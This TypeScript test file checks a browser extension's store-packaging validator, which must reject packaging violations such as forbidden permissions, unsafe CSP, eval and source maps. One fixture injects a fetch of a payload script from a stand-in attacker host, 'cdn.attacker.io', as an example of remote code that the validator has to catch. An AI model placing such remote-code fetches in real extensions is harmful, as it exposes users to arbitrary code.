/**
 * Store packaging: the offline validator (scripts/validate-store.mjs) accepts the real
 * release packages and listing kit, and rejects each store violation it is meant to catch;
 * the AMO source archive (scripts/source-archive.mjs) names every bundle input.
 */
import { spawnSync } from "node:child_process";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
// @ts-expect-error -- plain ESM build script without type declarations
import * as build from "../../scripts/build.mjs";
// @ts-expect-error -- plain ESM build script without type declarations
import { bundleInputs } from "../../scripts/source-archive.mjs";
// @ts-expect-error -- plain ESM build script without type declarations
import * as store from "../../scripts/validate-store.mjs";
// @ts-expect-error -- plain ESM build script without type declarations
import { readZip } from "../../scripts/zip.mjs";

const PACKAGE_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const STORE_DIR = join(PACKAGE_ROOT, "store");
const VALIDATOR = join(PACKAGE_ROOT, "scripts", "validate-store.mjs");
const VERSION = JSON.parse(readFileSync(join(PACKAGE_ROOT, "package.json"), "utf8"))
	.version as string;
const NUMERIC = build.manifestVersion(VERSION).version as string;

const STUB_ENTRIES: Record<string, string> = {
	"src/background/index.ts": "(globalThis as { __bg?: number }).__bg = 1;",
	"src/content/index.ts": "(globalThis as { __c?: number }).__c = 2;",
	"src/content/main-world.ts": "(globalThis as { __m?: number }).__m = 3;",
	"src/ui/popup.ts": `document.title = "popup";`,
	"src/ui/options.ts": `document.title = "options";`,
};

const temps: string[] = [];
function tempDir(prefix: string): string {
	const dir = mkdtempSync(join(tmpdir(), prefix));
	temps.push(dir);
	return dir;
}
afterAll(() => {
	for (const dir of temps) rmSync(dir, { recursive: true, force: true });
});

type Files = Map<string, Buffer>;
type Manifest = Record<string, unknown> & {
	permissions: string[];
	host_permissions: string[];
	content_security_policy: { extension_pages: string };
	browser_specific_settings?: { gecko: Record<string, unknown> };
};

let distDir: string;
let packages: Record<"chrome" | "firefox", Files>;
let justifications: unknown;

/** Real static files, manifests, locales and icons; stub scripts (bundling is build.test.ts's job). */
beforeAll(async () => {
	const entriesRoot = tempDir("aidr-bg-store-entries-");
	for (const [name, text] of Object.entries(STUB_ENTRIES)) {
		mkdirSync(dirname(join(entriesRoot, name)), { recursive: true });
		writeFileSync(join(entriesRoot, name), text);
	}
	distDir = tempDir("aidr-bg-store-dist-");
	await build.buildExtension({
		root: PACKAGE_ROOT,
		entriesRoot,
		outDir: distDir,
		release: true,
		zip: true,
		log: () => {},
	});
	const read = (target: string) =>
		readZip(readFileSync(join(distDir, `aidr-browser-guard-${target}-${NUMERIC}.zip`))) as Files;
	packages = { chrome: read("chrome"), firefox: read("firefox") };
	justifications = JSON.parse(readFileSync(join(STORE_DIR, "permissions.json"), "utf8"));
});

/** Entry of a package; a missing entry is a broken fixture, not a validator result. */
function entry(files: Files, name: string): Buffer {
	const data = files.get(name);
	if (!data) throw new Error(`fixture package lacks ${name}`);
	return data;
}

function gecko(manifest: Manifest): Record<string, unknown> {
	const settings = manifest.browser_specific_settings;
	if (!settings) throw new Error("fixture manifest lacks browser_specific_settings");
	return settings.gecko;
}

function mutate(files: Files, edit: (manifest: Manifest, files: Files) => void): Files {
	const copy = new Map([...files].map(([name, data]) => [name, Buffer.from(data)]));
	const manifest = JSON.parse(entry(copy, "manifest.json").toString("utf8")) as Manifest;
	edit(manifest, copy);
	copy.set("manifest.json", Buffer.from(JSON.stringify(manifest)));
	return copy;
}

function problemsOf(target: "chrome" | "firefox", files: Files): string[] {
	return store.validatePackage(target, files, {
		justifications,
		expectedVersion: NUMERIC,
	}) as string[];
}

describe("store validator: the real release packages and listing kit", () => {
	it("accepts the Chrome/Edge and Firefox zips of a release build", () => {
		expect(problemsOf("chrome", packages.chrome)).toEqual([]);
		expect(problemsOf("firefox", packages.firefox)).toEqual([]);
	});

	it("accepts the committed listing kit (descriptions, justifications, policy pages, images)", () => {
		const { problems } = store.validateListingKit(STORE_DIR, PACKAGE_ROOT);
		expect(problems).toEqual([]);
	});

	it("validates a whole dist directory and reports the privacy-contact placeholder as a notice", () => {
		const result = store.validateRelease({
			distDir,
			storeDir: STORE_DIR,
			version: VERSION,
			packageRoot: PACKAGE_ROOT,
		});
		expect(result.problems).toEqual([]);
		expect(result.packages).toEqual([
			`aidr-browser-guard-chrome-${NUMERIC}.zip`,
			`aidr-browser-guard-firefox-${NUMERIC}.zip`,
		]);
		expect(result.notices.join("\n")).toMatch(/PRIVACY_CONTACT_EMAIL/);
	});

	it("justifies exactly what the build manifests request, in English and Turkish", () => {
		const kit = justifications as {
			permissions: Record<string, { en: string; tr: string }>;
			optional_permissions: Record<string, unknown>;
			host_permissions: { hosts: Record<string, string> };
			optional_host_permissions: Record<string, unknown>;
		};
		const manifest = build.createManifest("chrome", { version: VERSION });
		expect(Object.keys(kit.permissions).sort()).toEqual([...manifest.permissions].sort());
		expect(Object.keys(kit.optional_permissions)).toEqual(manifest.optional_permissions);
		expect(Object.keys(kit.host_permissions.hosts).sort()).toEqual(
			[...manifest.host_permissions].sort(),
		);
		expect(Object.keys(kit.optional_host_permissions)).toEqual(manifest.optional_host_permissions);
	});

	it("short descriptions are the manifest descriptions the stores display", () => {
		for (const locale of ["en", "tr"]) {
			const messages = JSON.parse(
				readFileSync(join(PACKAGE_ROOT, "_locales", locale, "messages.json"), "utf8"),
			);
			const short = readFileSync(join(STORE_DIR, locale, "short-description.txt"), "utf8").trim();
			expect(short).toBe(messages.extDescription.message);
			expect([...short].length).toBeLessThanOrEqual(132);
		}
	});

	it("the CLI exits 0 on a valid dist and 1 when the packages are missing", () => {
		const ok = spawnSync(process.execPath, [VALIDATOR, "--dist", distDir, "--version", VERSION], {
			encoding: "utf8",
		});
		expect(ok.status, ok.stderr).toBe(0);
		expect(ok.stdout).toMatch(/pass the offline store checks/);
		const empty = tempDir("aidr-bg-store-empty-");
		const missing = spawnSync(
			process.execPath,
			[VALIDATOR, "--dist", empty, "--version", VERSION],
			{ encoding: "utf8" },
		);
		expect(missing.status).toBe(1);
		expect(missing.stderr).toMatch(
			new RegExp(`aidr-browser-guard-chrome-${NUMERIC.replace(/\./g, "\\.")}\\.zip: missing`),
		);
		const usage = spawnSync(process.execPath, [VALIDATOR, "--bogus"], { encoding: "utf8" });
		expect(usage.status).toBe(2);
	});
});

describe("store validator: package violations fail", () => {
	const cases: [string, "chrome" | "firefox", (m: Manifest, f: Files) => void, RegExp][] = [
		["a key field", "chrome", (m) => Object.assign(m, { key: "MIIBIjAN" }), /"key" field/],
		[
			"an update_url",
			"chrome",
			(m) => Object.assign(m, { update_url: "https://updates.example.com/x.xml" }),
			/update_url/,
		],
		[
			"a malformed version",
			"chrome",
			(m) => Object.assign(m, { version: "1.02" }),
			/version "1\.02"/,
		],
		[
			"a version over 65535",
			"firefox",
			(m) => Object.assign(m, { version: "1.70000" }),
			/version "1\.70000"/,
		],
		[
			"a missing 48px icon",
			"chrome",
			(m) => delete (m.icons as Record<string, string>)["48"],
			/icons lacks the 48x48 icon/,
		],
		[
			"an icon of the wrong size",
			"chrome",
			(_m, f) => f.set("icons/icon-48.png", entry(f, "icons/icon-16.png")),
			/icon-48\.png is 16x16, expected 48x48/,
		],
		["a forbidden permission", "chrome", (m) => m.permissions.push("tabs"), /requests "tabs"/],
		[
			"an unjustified permission",
			"chrome",
			(m) => m.permissions.push("notifications"),
			/"notifications" has no justification/,
		],
		[
			"a wildcard host permission",
			"chrome",
			(m) => m.host_permissions.push("https://*.example.com/*"),
			/not an exact https/,
		],
		[
			"<all_urls>",
			"firefox",
			(m) => m.host_permissions.push("<all_urls>"),
			/requests "<all_urls>"/,
		],
		[
			"a stale justification (permission no longer requested)",
			"chrome",
			(m) => m.permissions.splice(m.permissions.indexOf("scripting"), 1),
			/justifies permissions "scripting", which the manifest no longer requests/,
		],
		[
			"'unsafe-eval' in the CSP",
			"chrome",
			(m) => (m.content_security_policy.extension_pages += "; script-src 'self' 'unsafe-eval'"),
			/allows 'unsafe-eval'/,
		],
		[
			"a remote script source in the CSP",
			"chrome",
			(m) =>
				(m.content_security_policy.extension_pages =
					"script-src 'self' https://cdn.example.net; object-src 'none'"),
			/script-src allows https:\/\/cdn\.example\.net/,
		],
		[
			"a source map file",
			"chrome",
			(_m, f) => f.set("background.js.map", Buffer.from("{}")),
			/unexpected file in a store package: background\.js\.map/,
		],
		[
			"a sourceMappingURL comment",
			"firefox",
			(_m, f) =>
				f.set(
					"content.js",
					Buffer.concat([
						entry(f, "content.js"),
						Buffer.from("\n//# sourceMappingURL=content.js.map\n"),
					]),
				),
			/content\.js references a source map/,
		],
		[
			"eval in a bundle",
			"chrome",
			(_m, f) => f.set("popup.js", Buffer.from("eval('1')")),
			/popup\.js: eval\(\)/,
		],
		[
			"remote code (unexpected origin)",
			"chrome",
			(_m, f) => f.set("options.js", Buffer.from('fetch("https://cdn.attacker.io/payload.js")')),
			/remote URL https:\/\/cdn\.attacker\.io/,
		],
		[
			"a private key file",
			"chrome",
			(_m, f) => f.set("browser-guard.pem", Buffer.from("x")),
			/unexpected file.*browser-guard\.pem/,
		],
		[
			"a missing referenced page",
			"chrome",
			(_m, f) => f.delete("options.html"),
			/references options\.html, which is not in the package/,
		],
		[
			"a description over 132 characters",
			"chrome",
			(_m, f) => {
				const messages = JSON.parse(entry(f, "_locales/tr/messages.json").toString("utf8"));
				messages.extDescription.message = "x".repeat(133);
				f.set("_locales/tr/messages.json", Buffer.from(JSON.stringify(messages)));
			},
			/description \(_locales\/tr\) has 133 characters/,
		],
		[
			"browser_specific_settings in the Chrome build",
			"chrome",
			(m) => Object.assign(m, { browser_specific_settings: { gecko: {} } }),
			/must not carry browser_specific_settings/,
		],
		[
			"a wrong gecko id",
			"firefox",
			(m) => (gecko(m).id = "other@example.com"),
			/gecko\.id must be browser-guard@singularityrd\.com/,
		],
		[
			"no data_collection_permissions",
			"firefox",
			(m) => delete gecko(m).data_collection_permissions,
			/data_collection_permissions\.required is required/,
		],
	];

	for (const [name, target, edit, expected] of cases) {
		it(`rejects ${name}`, () => {
			const problems = problemsOf(target, mutate(packages[target], edit));
			expect(problems.join("\n")).toMatch(expected);
		});
	}

	it("benign twins pass: connect-src https:, the justified optional https://*/* origin, a version_name", () => {
		const files = mutate(packages.chrome, (m) => {
			m.version_name = "1.0.0-rc.1";
			expect(m.content_security_policy.extension_pages).toContain("connect-src 'self' https:");
			expect(m.optional_host_permissions).toEqual(["https://*/*"]);
		});
		expect(problemsOf("chrome", files)).toEqual([]);
		// A placeholder host in a bundle is not remote code (reserved example domains).
		const example = mutate(packages.firefox, (_m, f) =>
			f.set("options.js", Buffer.from('const doc = "https://aidr.example.com/docs";')),
		);
		expect(problemsOf("firefox", example)).toEqual([]);
	});

	it("cspProblems requires object-src and accepts the shipped CSP", () => {
		expect(store.cspProblems(build.EXTENSION_CSP)).toEqual([]);
		expect(store.cspProblems("script-src 'self'").join()).toMatch(/object-src/);
		expect(store.cspProblems(undefined).join()).toMatch(/missing/);
	});
});

describe("store validator: listing kit violations fail", () => {
	function kitWith(edit: (dir: string) => void): string[] {
		const dir = tempDir("aidr-bg-store-kit-");
		cpSync(STORE_DIR, dir, { recursive: true });
		edit(dir);
		return store.validateListingKit(dir, PACKAGE_ROOT).problems as string[];
	}
	const append = (file: string, text: string) =>
		writeFileSync(file, readFileSync(file, "utf8") + text);

	it("a short description that differs from the manifest description", () => {
		const problems = kitWith((dir) =>
			writeFileSync(join(dir, "en", "short-description.txt"), "Something else.\n"),
		);
		expect(problems.join("\n")).toMatch(
			/en\/short-description\.txt: differs from _locales\/en extDescription/,
		);
	});

	it("a detailed description without its not-covered section", () => {
		const problems = kitWith((dir) => {
			const file = join(dir, "tr", "description.txt");
			writeFileSync(file, readFileSync(file, "utf8").replace("KAPSAMADIKLARI", "DİĞER"));
		});
		expect(problems.join("\n")).toMatch(
			/tr\/description\.txt: the "KAPSAMADIKLARI" section is missing/,
		);
	});

	it("unverifiable claims in English and Turkish", () => {
		const problems = kitWith((dir) => {
			append(
				join(dir, "en", "description.txt"),
				"\nGuaranteed 100% protection of all sensitive data.\n",
			);
			append(join(dir, "tr", "single-purpose.txt"), " Eksiksiz koruma sağlar, KVKK uyumlu.");
		}).join("\n");
		expect(problems).toMatch(/en\/description\.txt: unverifiable claim \(100%\)/);
		expect(problems).toMatch(/en\/description\.txt: unverifiable claim \(guarantee\)/);
		expect(problems).toMatch(/en\/description\.txt: unverifiable claim \(all sensitive data\)/);
		expect(problems).toMatch(/tr\/single-purpose\.txt: unverifiable claim \(complete protection\)/);
		expect(problems).toMatch(
			/tr\/single-purpose\.txt: unverifiable claim \(regulatory compliance claim\)/,
		);
	});

	it("benign wording passes the claim filter", () => {
		expect(
			store.claimProblems(
				"It reduces the chance that sensitive data reaches AI services. Nothing is sent to the publisher.",
				"x",
			),
		).toEqual([]);
		expect(store.claimProblems("Kurumunuzun veri koruma politikasının yerini almaz.", "x")).toEqual(
			[],
		);
	});

	it("a description that is too short, a missing justification, a wrong image size, an external resource", () => {
		const problems = kitWith((dir) => {
			writeFileSync(join(dir, "tr", "description.txt"), "Kısa.\nKAPSAMADIKLARI\n- çok şey\n");
			const kit = JSON.parse(readFileSync(join(dir, "permissions.json"), "utf8"));
			delete kit.permissions.storage.tr;
			writeFileSync(join(dir, "permissions.json"), JSON.stringify(kit));
			cpSync(
				join(dir, "images", "promo-small-en.png"),
				join(dir, "images", "screenshot-9-wrong-en.png"),
			);
			append(join(dir, "privacy-policy.en.html"), '<img src="https://tracker.example.net/p.gif">');
		}).join("\n");
		expect(problems).toMatch(/tr\/description\.txt: \d+ characters \(stores accept 250-10000\)/);
		expect(problems).toMatch(/"storage" needs a tr justification/);
		expect(problems).toMatch(/screenshot-9-wrong-en\.png: 440x280, store size is 1280x800/);
		expect(problems).toMatch(/privacy-policy\.en\.html: must not load external resources/);
	});
});

describe("AMO source archive", () => {
	it("names every bundle input, including the shared privacy and core modules, and nothing from node_modules", async () => {
		const inputs = ((await bundleInputs()) as string[]).map((file) => file.replace(/\\/g, "/"));
		expect(
			inputs.some((file) => file.endsWith("packages/browser-guard/src/background/index.ts")),
		).toBe(true);
		expect(inputs.some((file) => file.endsWith("packages/browser-guard/src/sites/index.ts"))).toBe(
			true,
		);
		expect(inputs.some((file) => /packages\/privacy\/src\/detectors\.(?:js|ts)$/.test(file))).toBe(
			true,
		);
		expect(
			inputs.some((file) => /packages\/core\/src\/policy-canonical-json\.(?:js|ts)$/.test(file)),
		).toBe(true);
		expect(inputs.filter((file) => file.includes("/node_modules/"))).toEqual([]);
		expect(inputs.filter((file) => file.includes("/__tests__/"))).toEqual([]);
	}, 120_000);
});
